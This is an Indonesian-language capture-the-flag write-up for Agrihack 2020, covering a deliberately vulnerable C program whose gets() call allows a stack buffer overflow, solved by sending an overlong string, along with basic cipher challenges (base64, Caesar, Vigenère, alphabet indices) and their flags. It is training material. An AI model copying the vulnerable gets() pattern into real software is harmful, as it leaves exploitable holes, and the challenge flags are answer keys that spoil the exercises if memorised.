# WriteUp-Agrihack-2020

# Binary Exploitation
## FLOW 1 (100 Pts)

Diberikan sebuah source code:
```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

//gcc flow1.c -m32 -fno-stack-protector -no-pie -o flow1

void logo(){
  puts("██╗     ██╗███╗   ██╗███████╗");
  puts("██║     ██║████╗  ██║╚══███╔╝");
  puts("██║     ██║██╔██╗ ██║  ███╔╝ ");
  puts("██║     ██║██║╚██╗██║ ███╔╝  ");
  puts("███████╗██║██║ ╚████║███████╗");
  puts("╚══════╝╚═╝╚═╝  ╚═══╝╚══════╝");
}

void setup(){
	setvbuf(stdin,0,2,0);
	setvbuf(stdout,0,2,0);
}


int main(int argc, char **argv)
{
  logo();
  setup();
  volatile int modified;
  char buffer[64];
  modified = 0;
  
  printf("Put some text: ");

  gets(buffer);

  if(modified != 0) {
      system("cat flag.txt");
  } else {
      printf("Try again?\n");
  }
}
```

Dan sebuah nc 52.187.65.2 17001.
Dari code kita tahu bahwa buffer overflow terjadi ketika data char lebih dari 64 byte, langsung saja kita input karakter lebih dari 64 byte

```
ilham@ilham-Acer:~$ nc 52.187.65.2 17001
██╗     ██╗███╗   ██╗███████╗
██║     ██║████╗  ██║╚══███╔╝
██║     ██║██╔██╗ ██║  ███╔╝ 
██║     ██║██║╚██╗██║ ███╔╝  
███████╗██║██║ ╚████║███████╗
╚══════╝╚═╝╚═╝  ╚═══╝╚══════╝
Put some text: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
agrihack{Toooooooooo_much_character_is_dangerous_LINZ_IS_HERE}
/home/ctf/run_challenge.sh: line 2:   853 Segmentation fault      (core dumped) ./chall
```

**flag: agrihack{Toooooooooo_much_character_is_dangerous_LINZ_IS_HERE}**

# Cryptography

## Basic64 (100 pts)
Diberikan file enc.txt dan dilihat isinya:

![image22](https://user-images.githubusercontent.com/66354919/140281216-b8237a0a-cfcb-4de1-8c99-9808ea6cd34b.png)

Karena hintnya adalah base64, langsung saja kita decode base64 tersebut
```
In [4]: import base64

In [5]: base64.b64decode("YWdyaWhhY2t7YmFzaWNfdG9fa25vd19iYXNlNjR9")
Out[5]: 'agrihack{basic_to_know_base64}'
```
**sehingga flagnya: agrihack{basic_to_know_base64}**

## Introduction to Cipher_Series : ROMAN (120 pts)
Diberikan file caesar.png:

![image60](https://user-images.githubusercontent.com/66354919/140281378-d4b26a0b-1721-4c08-bfa6-8ab725a9da89.png)

Dilihat dari nama filenya, Isinya ciphertext yang kemungkinan caesarian cipher. Kita coba decode caesarian cipher tersebut di rumkin.com dengan percobaan shift dari 1 sampai 26.

![image38](https://user-images.githubusercontent.com/66354919/140281866-15332576-b255-417e-8cbf-0169d2a2a1fb.png)

**Dapet flagnya: agrihack{Gaius_Julius_Caesar}**

## Introduction to Cipher_Series : GiovanBattistaBellaso (120 pts)

Diberikan file enc.txt dan gambar seorang tokoh yang megang kunci dengan tambahan kata vibonacci. Hmmm… sepertinya kunci tersebut digunakan untuk mendecode ciphertext tersebut.

![image30](https://user-images.githubusercontent.com/66354919/140281985-95497aaa-210d-4969-81e0-16512754c421.png)

Setelah saya searching apa itu Giovan Battista Bellaso di sepuh google, ternyata tokoh tersebut yang menciptakan sandi vinegere. Langsung saja kita decode vinegere cipher di rumkin.com dengan key vibonacci.

![image6](https://user-images.githubusercontent.com/66354919/140282076-4c740b5e-79a7-46ae-94d6-f08b3377c6b9.png)

**Dapetlah flagnya: agrihack{Vignere_Ch1p3r’s_H3r3}**

## Introduction to Cipher_Series : Talking (120 pts)

![image36](https://user-images.githubusercontent.com/66354919/140282225-a8d47b50-768d-4e3d-a7af-1153211691bb.png)

Diberikan file yg isinya angka-angka. Karena kita tau kl format flagnya agrihack{}, maka dapat dilihat angka tersebut adalah Alphabet Order. Biar cepet gw langsung buat codenya di C++.

```
#include <cstdio>

int main(){
	int array[41]={1, 7, 18, 9, 8, 1, 3, 11, 38, 28, 20, 37, 10, 
		21, 19, 20, 37, 1, 12, 6, 8, 31, 2, 30, 
		20, 37, 18, 30, 16, 18, 30, 19, 30, 14, 34, 31, 34, 28, 27, 14, 39};
	char array2[41];
	for(int i=0;i<41;i++){
			array2[i]=array[i]+96;		
	}
	for(int i=0;i<41;i++){
		printf("%c",array2[i]);
	}
}
```
Dan yg keluar ternyata

![image32](https://user-images.githubusercontent.com/66354919/140282310-7d65d9ee-f601-4256-8aef-e566790acc9d.png)

Wadooh setelah saya liat-liat lagi ternyata beberapa angkanya lebih dari 26. Saya liat di hint: numbers come after letters, underscore come after numbers, Maka mungkin setelah angka 26 (huruf z), yakni angka 27 sampai 36 merupakan numbers, dan sisanya adalah underscore dan brace.

Maka listnya menjadi seperti ini:
27=0, 28=1, 29=2, 30=3, 31=4, 32=5, 33=6, 34=7, 35=8, 36=9, 37=_, 38={, 39=}.

Sehingga setelah saya coba decode manual hasil 
**flagnya: agrihack{1t_just_alfh4b3t_r3pr3s3n74710n}**

## BabyXOR (120 pts)
Diberikan file key.txt dan enc.txt. Dilihat dari nama soalnya, cara decodenya kemungkinan menggunakan metode XOR. langsung ae kita buat python scriptnya:






